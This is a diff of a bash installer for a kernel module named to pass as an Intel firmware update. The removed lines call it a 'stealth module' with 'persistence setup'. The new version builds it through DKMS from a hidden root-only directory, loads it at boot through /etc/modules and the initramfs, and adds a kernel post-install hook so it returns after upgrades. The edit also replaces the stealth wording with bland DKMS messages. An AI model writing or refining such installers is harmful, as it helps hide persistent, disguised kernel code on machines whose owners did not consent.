@@ -2,76 +2,49 @@
 set -e
 
 # Config
-MODULE_SRC="intel_fw_update.ko"  # Must exist in current directory when running
 MODULE_NAME="intel_fw_update"
+PACKAGE_VERSION="1.1"
+SRC_DIR="/usr/local/.intel_fw_update/src"
 HIDDEN_DIR="/usr/local/.intel_fw_update"
-HIDDEN_KO_PATH="$HIDDEN_DIR/$MODULE_SRC"
 MODULES_FILE="/etc/modules"
 HOOK_PATH="/etc/kernel/postinst.d/install_${MODULE_NAME}_module"
 
-echo "== [*] Checking for existing module =="
+echo "== [*] Installing DKMS and dependencies =="
 
-# Unload module if loaded
-if lsmod | grep -q "^${MODULE_NAME}"; then
-    echo "[*] Module $MODULE_NAME is loaded — unloading"
-    sudo modprobe -r "$MODULE_NAME"
+# Install DKMS if not present
+if ! command -v dkms >/dev/null 2>&1; then
+    echo "[*] Installing DKMS"
+    sudo apt update
+    sudo apt install -y dkms build-essential
 fi
 
-# Remove old entry in /etc/modules
-if grep -q "^${MODULE_NAME}$" "$MODULES_FILE"; then
-    echo "[*] Removing $MODULE_NAME from $MODULES_FILE"
-    sudo sed -i "/^${MODULE_NAME}$/d" "$MODULES_FILE"
+echo "== [*] Setting up DKMS module =="
+
+# Create source directory
+if [ -d "$SRC_DIR" ]; then
+    echo "[*] Removing existing DKMS source"
+    sudo rm -rf "$SRC_DIR"
 fi
 
-# Remove installed module file for current kernel
-INSTALL_DIR="/lib/modules/$(uname -r)/updates/firmware-intel"
-MODULE_PATH="$INSTALL_DIR/${MODULE_NAME}.ko"
+echo "[*] Copying source to $SRC_DIR"
+sudo mkdir -p "$SRC_DIR"
+sudo cp Makefile intel_fw_update.c dkms.conf "$SRC_DIR/"
+sudo chown -R root:root "$SRC_DIR"
+sudo chmod -R 700 "$HIDDEN_DIR"  # Ensure hidden dir is restricted
 
-if [ -f "$MODULE_PATH" ]; then
-    echo "[*] Removing old $MODULE_PATH"
-    sudo rm -f "$MODULE_PATH"
-fi
+# Add to DKMS
+echo "[*] Adding module to DKMS"
+sudo dkms add ${MODULE_NAME}/${PACKAGE_VERSION}
 
-echo "== [*] Installing stealth module =="
+# Build for current kernel
+echo "[*] Building module with DKMS"
+sudo dkms build ${MODULE_NAME}/${PACKAGE_VERSION}
 
-# Check .ko exists in current directory
-if [ ! -f "$MODULE_SRC" ]; then
-    echo "[!] Error: $MODULE_SRC not found in current directory"
-    exit 1
-fi
+# Install
+echo "[*] Installing module with DKMS"
+sudo dkms install ${MODULE_NAME}/${PACKAGE_VERSION}
 
-# Create hidden directory if needed
-if [ ! -d "$HIDDEN_DIR" ]; then
-    echo "[*] Creating hidden directory $HIDDEN_DIR"
-    sudo mkdir -p "$HIDDEN_DIR"
-    sudo chmod 700 "$HIDDEN_DIR"
-fi
-
-# Copy .ko to hidden directory if not already there or if different
-COPY_NEEDED=1
-if [ -f "$HIDDEN_KO_PATH" ]; then
-    if cmp -s "$MODULE_SRC" "$HIDDEN_KO_PATH"; then
-        COPY_NEEDED=0
-    fi
-fi
-
-if [ $COPY_NEEDED -eq 1 ]; then
-    echo "[*] Copying $MODULE_SRC to hidden location $HIDDEN_KO_PATH"
-    sudo cp "$MODULE_SRC" "$HIDDEN_KO_PATH"
-    sudo chmod 600 "$HIDDEN_KO_PATH"
-fi
-
-# Create kernel modules install dir
-if [ ! -d "$INSTALL_DIR" ]; then
-    echo "[*] Creating directory $INSTALL_DIR"
-    sudo mkdir -p "$INSTALL_DIR"
-fi
-
-# Copy module from hidden dir to kernel modules folder
-echo "[*] Installing module from hidden directory to $MODULE_PATH"
-sudo cp "$HIDDEN_KO_PATH" "$MODULE_PATH"
-
-# Update module dependencies for current kernel
+# Update module dependencies
 echo "[*] Running depmod"
 sudo depmod -a
 
@@ -89,26 +62,23 @@ sudo update-initramfs -u
 echo "[*] Loading module using modprobe"
 sudo modprobe "$MODULE_NAME"
 
-# Create kernel update hook script
-echo "== [*] Creating kernel update hook script to reinstall module on kernel upgrades"
+# Create kernel update hook script (backup)
+echo "== [*] Creating kernel update hook script as backup"
 
 sudo tee "$HOOK_PATH" > /dev/null << EOF
 #!/bin/bash
 # Kernel post-install hook to reinstall $MODULE_NAME module after kernel updates
 
 MODULE_NAME="$MODULE_NAME"
-HIDDEN_KO_PATH="$HIDDEN_KO_PATH"
+PACKAGE_VERSION="$PACKAGE_VERSION"
 
-KVER="\$1"
-INSTALL_DIR="/lib/modules/\$KVER/updates/firmware-intel"
-MODULE_PATH="\$INSTALL_DIR/\${MODULE_NAME}.ko"
-
-mkdir -p "\$INSTALL_DIR"
-cp "\$HIDDEN_KO_PATH" "\$MODULE_PATH"
-depmod -a -b /lib/modules/\$KVER
-update-initramfs -u -k "\$KVER"
+dkms build \${MODULE_NAME}/\${PACKAGE_VERSION}
+dkms install \${MODULE_NAME}/\${PACKAGE_VERSION}
+depmod -a
+update-initramfs -u
 EOF
 
 sudo chmod +x "$HOOK_PATH"
 
-echo "== [✓] Installation and persistence setup complete =="
+echo "== [✓] Installation and DKMS setup complete =="
+echo "The module will auto-rebuild for new kernels via DKMS."
